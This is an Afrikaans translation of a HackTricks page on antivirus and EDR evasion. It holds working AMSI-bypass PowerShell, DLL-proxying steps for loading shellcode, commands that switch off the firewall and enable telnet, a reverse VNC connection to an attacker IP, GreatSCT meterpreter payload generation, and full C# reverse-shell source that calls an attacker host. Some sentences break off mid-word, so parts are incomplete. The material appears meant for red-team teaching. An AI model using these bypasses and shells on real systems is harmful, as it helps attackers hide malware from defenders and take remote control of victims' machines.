# Antivirus (AV) Oorspoel

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

**Hierdie bladsy is geskryf deur** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**!**

## **AV Ontwijkingsmetodologie**

Tans gebruik AV's verskillende metodes om te kontroleer of 'n lêer skadelik is of nie, statiese opsporing, dinamiese analise, en vir die meer gevorderde EDR's, gedragsanalise.

### **Statiese opsporing**

Statiese opsporing word bereik deur bekende skadelike strings of reekse van bytes in 'n binêre of skripsie te merk, en ook inligting uit die lêer self te onttrek (bv. lêerbeskrywing, maatskappy naam, digitale handtekeninge, ikoon, kontrolesom, ens.). Dit beteken dat die gebruik van bekende openbare gereedskap jou makliker kan vang, aangesien hulle waarskynlik geanaliseer en as skadelik geïdentifiseer is. Daar is 'n paar maniere om hierdie soort opsporing te omseil:

* **Versleuteling**

As jy die binêre lêer versleutel, sal daar geen manier vir AV wees om jou program op te spoor nie, maar jy sal 'n soort laaier benodig om die program in geheue te ontsluit en uit te voer.

* **Obfuskasie**

Soms hoef jy net 'n paar strings in jou binêre of skripsie te verander om dit verby AV te kry, maar dit kan 'n tydrowende taak wees, afhangende van wat jy probeer obfuskeer.

* **Aangepaste gereedskap**

As jy jou eie gereedskap ontwikkel, sal daar geen bekende slegte handtekeninge wees nie, maar dit verg baie tyd en moeite.

{% hint style="info" %}
'N Goeie manier om teen Windows Defender se statiese opsporing te toets is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dit verdeel die lêer basies in meervoudige segmente en vra dan Defender om elkeen individueel te skandeer, op hierdie manier kan dit jou presies vertel wat die geïdentifiseerde strings of bytes in jou binêre is.
{% endhint %}

Ek beveel sterk aan om hierdie [YouTube-afspeellys](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) oor praktiese AV-ontwykings te kyk.

### **Dinamiese analise**

Dinamiese analise is wanneer die AV jou binêre lêer in 'n sandboks laat loop en vir skadelike aktiwiteit kyk (bv. probeer om jou blaaier se wagwoorde te ontsluit en te lees, 'n minidump op LSASS uit te voer, ens.). Hierdie deel kan 'n bietjie moeiliker wees om mee te werk, maar hier is 'n paar dinge wat jy kan doen om sandbokse te ontwyk.

* **Slaap voor uitvoering** Afhangende van hoe dit geïmplementeer is, kan dit 'n goeie manier wees om AV se dinamiese analise te omseil. AV's het 'n baie kort tyd om lêers te skandeer om nie die gebruiker se werkstroom te onderbreek nie, dus kan lang slaaptye die analise van binêre lêers versteur. Die probleem is dat baie AV-sandbokse die slaap kan ignoreer, afhangende van hoe dit geïmplementeer is.
* **Kontroleer van die masjien se hulpbronne** Gewoonlik het Sandbokse baie min hulpbronne om mee te werk (bv. < 2GB RAM), anders kan hulle die gebruiker se masjien vertraag. Jy kan ook baie kreatief hier wees, byvoorbeeld deur die CPU se temperatuur of selfs die waaier se spoed te kontroleer, nie alles sal in die sandboks geïmplementeer word nie.
* **Masjien-spesifieke kontroles** As jy 'n gebruiker wil teiken wie se werkstasie by die "contoso.local" domein aangesluit is, kan jy 'n kontrole op die rekenaar se domein doen om te sien of dit ooreenstem met die een wat jy gespesifiseer het, as dit nie is nie, kan jy jou program laat afsluit.

Dit blyk dat Microsoft Defender se Sandboks-rekenaar se naam HAL9TH is, so, jy kan vir die rekenaarnaam in jou malware kyk voor detonasie, as die naam HAL9TH ooreenstem, beteken dit dat jy binne die verdediger se sandboks is, sodat jy jou program kan laat afsluit.

<figure><img src="../.gitbook/assets/image (206).png" alt=""><figcaption><p>bron: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sommige ander baie goeie wenke van [@mgeeky](https://twitter.com/mariuszbit) vir teen Sandbokse te werk

<figure><img src="../.gitbook/assets/image (245).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev-kanaal</p></figcaption></figure>

Soos ons voorheen in hierdie pos gesê het, sal **openbare gereedskap** uiteindelik **opgespoor word**, dus moet jy jouself iets afvra:

Byvoorbeeld, as jy LSASS wil dump, **moet jy regtig mimikatz gebruik**? Of kan jy 'n ander projek gebruik wat minder bekend is en ook LSASS dump.

Die regte antwoord is waarskynlik die laaste. Neem mimikatz as 'n voorbeeld, dit is waarskynlik een van, indien nie die mees geïdentifiseerde stuk malware deur AV's en EDR's, terwyl die projek self super cool is, is dit ook 'n nagmerrie om daarmee te werk om AV's te omseil, soek dus net na alternatiewe vir wat jy probeer bereik.

{% hint style="info" %}
Wanneer jy jou lading vir ontwyking wysig, maak seker om **outomatiese monsterindiening af te skakel** in verdediger, en asseblief, ernstig, **MOET NIE NA VIRUSTOTAL OPLAAD NIE** as jou doel is om ontwyking op die lang duur te bereik. As jy wil sien of jou lading deur 'n spesifieke AV opgespoor word, installeer dit op 'n VM, probeer om die outomatiese monsterindiening af te skakel, en toets dit daar totdat jy tevrede is met die resultaat.
{% endhint %}

## EXE vs DLL

Wanneer moontlik, **prioritiseer altyd die gebruik van DLL's vir ontwyking**, in my ervaring word DLL-lêers gewoonlik **veel minder opgespoor** en geanaliseer, so dit is 'n baie eenvoudige truuk om te gebruik om opsporing in sommige gevalle te vermy (as jou lading 'n manier het om as 'n DLL uit te voer natuurlik).

Soos ons in hierdie beeld kan sien, het 'n DLL-lading van Havoc 'n opsporingstempo van 4/26 in antiscan.me, terwyl die EXE-lading 'n opsporingstempo van 7/26 het.

<figure><img src="../.gitbook/assets/image (1127).png" alt=""><figcaption><p>antiscan.me-vergelyking van 'n normale Havoc EXE-lading teen 'n normale Havoc DLL</p></figcaption></figure>

Nou sal ons wys van 'n paar truuks wat jy met DLL-lêers kan gebruik om baie meer heimlik te wees.
## DLL Sydeloading & Proksieë

**DLL Sydeloading** maak gebruik van die DLL-soekvolgorde wat deur die lêer gebruik word deur beide die slagoffer-toepassing en skadelike vragte langs mekaar te posisioneer.

Jy kan programme wat vatbaar is vir DLL Sydeloading nagaan met behulp van [Siofra](https://github.com/Cybereason/siofra) en die volgende Powershell-skrip:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

Hierdie bevel sal die lys van programme wat vatbaar is vir DLL hijacking binne "C:\Program Files\\" en die DLL lêers wat hulle probeer laai, uitvoer.

Ek beveel sterk aan dat jy **DLL Hijackable/Sideloadable programme self verken**, hierdie tegniek is redelik slu en as dit behoorlik gedoen word, maar as jy openlik bekende DLL Sideloadable programme gebruik, kan jy maklik gevang word.

Net deur 'n skadelike DLL met die naam wat 'n program verwag om te laai, te plaas, sal jou lading nie laai nie, aangesien die program verwag dat daar spesifieke funksies binne daardie DLL is. Om hierdie probleem op te los, sal ons 'n ander tegniek genaamd **DLL Proxying/Forwarding** gebruik.

**DLL Proxying** stuur die oproepe wat 'n program vanaf die proxy (en skadelike) DLL maak na die oorspronklike DLL, wat die funksionaliteit van die program behou en die uitvoering van jou lading kan hanteer.

Ek sal die [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projek van [@flangvik](https://twitter.com/Flangvik/) gebruik.

Dit is die stappe wat ek gevolg het:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Die laaste bevel sal vir ons 2 lêers gee: 'n DLL-bronkode-sjabloon en die oorspronklike hernoemde DLL.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

Hierdie is die resultate:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Beide ons shellcode (geënkripteer met [SGN](https://github.com/EgeBalci/sgn)) en die proxy DLL het 'n 0/26 Opvangs tempo in [antiscan.me](https://antiscan.me)! Ek sou dit 'n sukses noem.

<figure><img src="../.gitbook/assets/image (190).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Ek **beveel sterk aan** dat jy [S3cur3Th1sSh1t se twitch VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading kyk en ook [ippsec se video](https://www.youtube.com/watch?v=3eROsG\_WNpE) om meer te leer oor wat ons meer in-diepte bespreek het.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is 'n nutstuk vir die omseil van EDRs deur opgeskorte prosesse, direkte syscalls, en alternatiewe uitvoeringsmetodes te gebruik`

Jy kan Freeze gebruik om jou shellcode op 'n sluipende wyse te laai en uit te voer.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Ontduiking is net 'n kat-en-muis-speletjie, wat vandag werk, kan môre opgespoor word, so moenie net op een instrument staatmaak nie, probeer indien moontlik om verskeie ontduikingstegnieke aan mekaar te koppel.
{% endhint %}

## AMSI (Anti-Malware Scan Interface)

AMSI is geskep om "[lêerlose malware](https://en.wikipedia.org/wiki/Fileless\_malware)" te voorkom. Aanvanklik kon AV's slegs **lêers op skyf** skandeer, dus as jy op een of ander manier ladinge **direk in die geheue kon uitvoer**, kon die AV niks doen om dit te voorkom nie, omdat dit nie genoeg sigbaarheid gehad het nie.

Die AMSI-funksie is geïntegreer in hierdie komponente van Windows.

* Gebruikersrekeningbeheer, of UAC (verhoging van EXE, COM, MSI, of ActiveX-installasie)
* PowerShell (scripts, interaktiewe gebruik, en dinamiese kode-evaluering)
* Windows Script Host (wscript.exe en cscript.exe)
* JavaScript en VBScript
* Office VBA-makro's

Dit stel antivirusoplossings in staat om skripsiegedrag te inspekteer deur skripinhoud bloot te stel in 'n vorm wat beide onversleutel en onversluier is.

As jy `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` hardloop, sal dit die volgende waarskuwing op Windows Defender produseer.

<figure><img src="../.gitbook/assets/image (1132).png" alt=""><figcaption></figcaption></figure>

Let daarop hoe dit `amsi:` voorvoeg en dan die pad na die uitvoerbare lêer waaruit die skrip uitgevoer is, in hierdie geval, powershell.exe

Ons het geen lêer na skyf gelaat nie, maar is steeds in die geheue gevang vanweë AMSI.

Daar is 'n paar maniere om om AMSI te kom:

* **Obfuskasie**

Aangesien AMSI hoofsaaklik met statiese opsporings werk, kan die wysiging van die skripte wat jy probeer laai 'n goeie manier wees om opsporing te ontduik.

Nietemin het AMSI die vermoë om skripte te ontsluier selfs as dit meervoudige lae het, dus kan obfuskasie 'n slegte opsie wees, afhangende van hoe dit gedoen is. Dit maak dit nie so eenvoudig om te ontduik nie. Alhoewel, soms is alles wat jy hoef te doen, 'n paar veranderlike name te verander en jy sal goed wees, dus dit hang af van hoeveel iets geïdentifiseer is.

* **AMSI-ontduiking**

Aangesien AMSI geïmplementeer word deur 'n DLL in die powershell (ook cscript.exe, wscript.exe, ens.) proses te laai, is dit moontlik om dit maklik te manipuleer selfs as 'n onbevoorregte gebruiker. As gevolg van hierdie fout in die implementering van AMSI, het navorsers verskeie maniere gevind om AMSI-skandering te ontduik.

**Forseer 'n Fout**

Die forsering van die AMSI-inisialisering om te misluk (amsiInitFailed) sal tot gevolg hê dat geen skandering vir die huidige proses geïnisieer sal word nie. Aanvanklik is dit bekendgemaak deur [Matt Graeber](https://twitter.com/mattifestation) en Microsoft het 'n handtekening ontwikkel om wyer gebruik te voorkom.

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

Dit het net een lyn van powershell-kode geneem om AMSI onbruikbaar te maak vir die huidige powershell-proses. Hierdie lyn is natuurlik deur AMSI self geïdentifiseer, dus 'n bietjie aanpassing is nodig om hierdie tegniek te gebruik.

Hier is 'n aangepaste AMSI-omleiding wat ek geneem het van hierdie [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**Geheue Patching**

Hierdie tegniek is aanvanklik ontdek deur [@RastaMouse](https://twitter.com/\_RastaMouse/) en behels die vind van die adres vir die "AmsiScanBuffer" funksie in amsi.dll (verantwoordelik vir die skandering van die gebruiker-gelewerde insette) en dit te oorskryf met instruksies om die kode vir E\_INVALIDARG terug te gee, op hierdie manier sal die resultaat van die werklike skandering 0 teruggee, wat geïnterpreteer word as 'n skoon resultaat.

{% hint style="info" %}
Lees asseblief [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir 'n meer gedetailleerde verduideliking.
{% endhint %}

Daar is ook baie ander tegnieke wat gebruik word om AMSI met PowerShell te omseil, kyk na [**hierdie bladsy**](basic-powershell-for-pentesters/#amsi-bypass) en [hierdie bewaarplek](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) om meer daaroor te leer.

Of hierdie skripsie wat via geheue patching elke nuwe Powersh

## Obfuskasie

Daar is verskeie gereedskap wat gebruik kan word om **C#-tekskode te obfuskasie**, **metaprogrammeringstempaltes** te genereer om bineêre lêers saam te stel of **obfuskasie van saamgestelde bineêre lêers** soos:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuskator**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om 'n oopbron aftakking van die [LLVM](http://www.llvm.org/) samestellingsuite te voorsien wat verhoogde sagteware-sekuriteit kan bied deur [kode-obfuskasie](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) en knoei-bestandheid.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe om `C++11/14` taal te gebruik om, tydens samestelling, obfuskeerde kode te genereer sonder om enige eksterne gereedskap te gebruik en sonder om die samesteller te wysig.
* [**obfy**](https://github.com/fritzone/obfy): Voeg 'n laag van obfuskasie-operasies gegenereer deur die C++-sjabloonmetaprogrammeringsraamwerk by wat die lewe van die persoon wat die aansoek wil kraak, 'n bietjie moeiliker sal maak.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is 'n x64 bineêre obfuskator wat in staat is om verskeie verskillende pe-lêers te obfuskasieer, insluitend: .exe, .dll, .sys
* [**metame**](https://github.com/a0rtega/metame): Metame is 'n eenvoudige metamorfiese kode-enjin vir willekeurige uitvoerbare lêers.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is 'n fynkorrelige kode-obfuskasieraamwerk vir LLVM-ondersteunde tale wat ROP (retour-georiënteerde programmering) gebruik. ROPfuscator obfuskasieer 'n program op die samestellingskodevlak deur gewone instruksies in ROP-reekse te omskep, wat ons natuurlike konsep van normale beheerstroom dwarsboom.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is 'n .NET PE Crypter geskryf in Nim
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor is in staat om bestaande EXE/DLL in skelkode om te skakel en dit dan te laai

## SmartScreen & MoTW

Jy het dalk hierdie skerm gesien wanneer jy sekere uitvoerbare lêers van die internet aflaai en uitvoer.

Microsoft Defender SmartScreen is 'n sekuriteitsmeganisme wat bedoel is om die eindgebruiker te beskerm teen die uitvoer van potensieel skadelike aansoeke.

<figure><img src="../.gitbook/assets/image (661).png" alt=""><figcaption></figcaption></figure>

SmartScreen werk hoofsaaklik met 'n reputasie-gebaseerde benadering, wat beteken dat ongewone afgelaaide aansoeke SmartScreen sal aktiveer en sodoende die eindgebruiker waarsku en verhoed om die lêer uit te voer (alhoewel die lêer steeds uitgevoer kan word deur Meer inligting -> Hoe dan ook uit te voer).

**MoTW** (Mark of The Web) is 'n [NTFS Alternatiewe Datastroom](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) met die naam Zone.Identifier wat outomaties geskep word wanneer lêers van die internet afgelaai word, saam met die URL waarvan dit afgelaai is.

<figure><img src="../.gitbook/assets/image (234).png" alt=""><figcaption><p>Kontroleer die Zone.Identifier ADS vir 'n lêer wat van die internet afgelaai is.</p></figcaption></figure>

{% hint style="info" %}
Dit is belangrik om te let dat uitvoerbare lêers wat met 'n **vertroude** ondertekeningsertifikaat **SmartScreen nie sal aktiveer** nie.
{% endhint %}

'N Baie effektiewe manier om te voorkom dat jou vragte die Mark of The Web kry, is deur hulle binne 'n soort houer soos 'n ISO te verpak. Dit gebeur omdat Mark-of-the-Web (MOTW) **nie** op **nie-NTFS** volumes toegepas kan word nie.

<figure><img src="../.gitbook/assets/image (636).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is 'n gereedskap wat vragte in uitvoerhouers pakketteer om Mark-of-the-Web te ontduik.

Voorbeeldgebruik:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hier is 'n demonstrasie om SmartScreen te omseil deur ladinge binne ISO-lêers te verpak met behulp van [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C# Monteer Refleksie

Die laai van C# bineêre lêers in geheue is al 'n geruime tyd bekend en dit is steeds 'n baie goeie manier om jou post-exploitation-gereedskap uit te voer sonder om deur AV gevang te word.

Aangesien die lading direk in geheue gelaai sal word sonder om die skyf aan te raak, sal ons slegs oorweging hoef te maak oor die patching van AMSI vir die hele proses.

Die meeste C2-raamwerke (silwer, Covenant, metasploit, CobaltStrike, Havoc, ens.) bied reeds die vermoë om C# monteer direk in geheue uit te voer, maar daar is verskillende maniere om dit te doen:

* **Vurk\&Voer**

Dit behels **die skep van 'n nuwe offerproses**, inspuiting van jou post-exploitation kwaadwillige kode in daardie nuwe proses, uitvoering van jou kwaadwillige kode en wanneer klaar, die nuwe proses doodmaak. Dit het sowel sy voordele as sy nadele. Die voordeel van die vurk en voer metode is dat die uitvoering plaasvind **buite** ons Beacon implantaatproses. Dit beteken dat as iets verkeerd loop of gevang word in ons post-exploitation-aksie, is daar 'n **veel groter kans** dat ons **implantaat oorleef.** Die nadeel is dat jy 'n **groter kans** het om gevang te word deur **Gedragsopsporing**.

<figure><img src="../.gitbook/assets/image (212).png" alt=""><figcaption></figcaption></figure>

* **Inline**

Dit gaan daaroor om die post-exploitation kwaadwillige kode **in sy eie proses** in te spuit. Op hierdie manier kan jy vermy om 'n nuwe proses te skep en dit te laat deur AV skandeer, maar die nadeel is dat as iets verkeerd loop met die uitvoering van jou lading, is daar 'n **veel groter kans** om **jou sein** te verloor aangesien dit kan vasloop.

<figure><img src="../.gitbook/assets/image (1133).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
As jy meer wil lees oor C# Monteer laai, kyk gerus na hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

Jy kan ook C# Monteer **vanuit PowerShell** laai, kyk na [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) en [S3cur3th1sSh1t se video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Gebruik van Ander Programmeringstale

Soos voorgestel in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), is dit moontlik om kwaadwillige kode uit te voer met behulp van ander tale deur die gekompromitteerde masjien toegang te gee **tot die tolk-omgewing wat op die Aanvaller Beheerde SMB-aandeel geïnstalleer is**.

Deur toegang tot die Tolkbineêre en die omgewing op die SMB-aandeel toe te laat, kan jy **willekeurige kode in hierdie tale binne die geheue** van die gekompromitteerde masjien uitvoer.

Die repo dui aan: Verdediger skandeer steeds die skripte, maar deur gebruik te maak van Go, Java, PHP ens. het ons **meer buigsaamheid om statiese handtekeninge te omseil**. Toetsing met lukrake onversleutelde omgekeerde dop skripte in hierdie tale het suksesvol bewys.

## Gevorderde Ontduiking

Ontduiking is 'n baie ingewikkelde onderwerp, soms moet jy rekening hou met baie verskillende bronne van telemetrie in net een stelsel, dus dit is baie moeilik om heeltemal onopgemerk te bly in volwasse omgewings.

Elke omgewing waarteen jy te staan kom, sal hul eie sterktes en swakhede hê.

Ek moedig jou sterk aan om na hierdie praatjie van [@ATTL4S](https://twitter.com/DaniLJ94) te kyk, om 'n voet in die deur te kry vir meer Gevorderde Ontduikingstegnieke.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

Dit is ook 'n ander goeie praatjie van [@mariuszbit](https://twitter.com/mariuszbit) oor Ontduiking in Diepte.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Ou Tegnieke**

### **Kyk watter dele Defender as kwaadwillig beskou**

Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik wat dele van die bineêre lêer sal **verwyder** totdat dit uitvind watter deel Defender as kwaadwillig beskou en dit aan jou sal opsplits.\
'n Ander instrument wat dieselfde ding doen, is [**avred**](https://github.com/dobin/avred) met 'n oop web wat die diens aanbied in [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Maak dit **begin** wanneer die stelsel begin en **hardloop** dit nou:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Verander telnet-poort** (stealth) en skakel firewall af:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Laai dit af van: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (jy wil die binêre aflaaie hê, nie die opstelling nie)

**OP DIE GASHEER**: Voer _**winvnc.exe**_ uit en konfigureer die bediener:

* Skakel die opsie _Disable TrayIcon_ in
* Stel 'n wagwoord in _VNC Password_
* Stel 'n wagwoord in _View-Only Password_

Beweeg dan die binêre _**winvnc.exe**_ en **nuutgeskepte** lêer _**UltraVNC.ini**_ binne die **slagoffer**

#### **Omgekeerde verbinding**

Die **aanvaller** moet binne sy **gasheer** die binêre `vncviewer.exe -listen 5900` uitvoer sodat dit gereed sal wees om 'n omgekeerde **VNC-verbinding** te vang. Dan, binne die **slagoffer**: Begin die winvnc daemon `winvnc.exe -run` en hardloop `winwnc.exe [-autoreconnect] -connect <aanvaller_ip>::5900`

**WAARSKUWING:** Om onsigbaarheid te handhaaf, moet jy nie 'n paar dinge doen nie

* Moet nie `winvnc` begin as dit reeds loop nie, anders sal jy 'n [popup](https://i.imgur.com/1SROTTl.png) veroorsaak. kontroleer of dit loop met `tasklist | findstr winvnc`
* Moet nie `winvnc` begin sonder `UltraVNC.ini` in dieselfde gids nie, anders sal dit [die opstelvenster](https://i.imgur.com/rfMQWcf.png) laat oopmaak
* Moet nie `winvnc -h` vir hulp hardloop nie, anders sal jy 'n [popup](https://i.imgur.com/oc18wcu.png) veroorsaak

### GreatSCT

Laai dit af van: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Binne GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Begin **die luisteraar** met `msfconsole -r file.rc` en **voer** die **xml-payload** uit met:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Huidige verdediger sal die proses baie vinnig beëindig.**

### Kompilering van ons eie omgekeerde dop

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Eerste C# Omgekeerde dop

Kompileer dit met:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Gebruik dit met:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# gebruik van 'n kompilator
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Outomatiese aflaai en uitvoering:
```csharp
64bit:
